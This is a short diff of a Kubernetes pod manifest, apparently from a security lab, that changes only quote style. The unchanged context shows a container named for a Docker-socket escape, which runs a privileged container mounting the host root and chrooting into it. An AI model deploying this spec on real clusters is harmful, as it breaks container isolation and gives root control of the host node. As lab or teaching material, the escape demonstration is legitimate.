@@ -7,5 +7,5 @@ spec:
   - name: container-escape-using-docker-socket
     image: angelrita/base-ubuntu:latest
     #imagePullPolicy: Never
-    command: ["sh"]
+    command: ['sh']
     args: ['-c', 'docker run --rm -it --privileged -v /:/mnt alpine chroot /mnt']
